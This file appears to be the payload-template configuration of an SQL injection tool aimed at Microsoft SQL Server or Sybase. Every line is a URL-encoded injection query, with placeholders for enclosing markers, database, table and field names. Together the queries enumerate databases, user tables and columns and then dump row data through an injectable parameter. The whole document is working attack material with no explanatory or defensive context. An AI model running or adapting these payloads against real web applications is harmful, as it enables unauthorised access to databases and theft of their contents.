schema.database: select rr %2b'${TRAIL_SQL}'r from ( select '${ENCLOSE_VALUE_SQL}' %2bt.name %2b'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'rr from (select distinct name from master..sysdatabases)t, (select distinct name from master..sysdatabases)t1 where t.name>=t1.name group by t.name {limit} )a
schema.table: select rr %2b'${TRAIL_SQL}'r from ( select '${ENCLOSE_VALUE_SQL}' %2bt.name %2b'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'rr from (select distinct name from ${DATABASE}..sysobjects where type='U')t, (select distinct name from ${DATABASE}..sysobjects where type='U')t1 where t.name>=t1.name group by t.name {limit} )a
schema.column: select rr %2b'${TRAIL_SQL}'r from ( select '${ENCLOSE_VALUE_SQL}' %2bt.name %2b'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'rr from (select distinct c.name from ${DATABASE}..syscolumns c inner join ${DATABASE}..sysobjects t on c.id=t.id where t.name='${TABLE}')t, (select distinct c.name from ${DATABASE}..syscolumns c inner join ${DATABASE}..sysobjects t on c.id=t.id where t.name='${TABLE}')t1 where t.name>=t1.name group by t.name {limit} )a

row.query: select rr %2b'${TRAIL_SQL}'r from ( select '${ENCLOSE_VALUE_SQL}' %2bt.s %2b'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'rr from (select distinct ${FIELDS} s from ${DATABASE}..${TABLE})t, (select distinct ${FIELDS} s from ${DATABASE}..${TABLE})t1 where t.s>=t1.s group by t.s {limit} )a
